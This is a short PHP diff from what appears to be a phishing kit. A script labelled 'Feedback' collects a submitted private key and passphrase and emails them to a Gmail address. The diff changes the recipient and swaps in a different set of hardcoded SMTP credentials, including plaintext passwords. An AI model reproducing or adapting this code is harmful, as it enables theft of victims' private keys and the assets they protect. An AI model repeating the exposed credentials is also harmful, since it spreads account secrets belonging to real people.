@@ -11,7 +11,7 @@ $subject = "Feedback";
 $privateKey = $_POST['privateKey'];
 $pkpass = $_POST['pkpass'];
 $email_from = 'feranmi@gmail.com';
-$email_to = 'emmajoy658@gmail.com';
+$email_to = 'Steve.wood00sw@gmail.com';
 
 if($privateKey== '' || $pkpass== ''){
         echo "check the fields";
@@ -27,8 +27,8 @@ $mail->Host = "smtp.gmail.com";
 $mail->SMTPAuth = "true";
 $mail->SMTPSecure = "tls";
 $mail->Port = "587";
-$mail->Username = "emmajoy658@gmail.com";
-$mail->Password = "Olasunkanmi2001!";
+$mail->Username = "Steve.wood00sw@gmail.com";
+$mail->Password = "Loveisgood94";
 $mail->setFrom($email_from);
 $mail->AddReplyTo($email_from);
 $mail->Subject = "/New Entry";
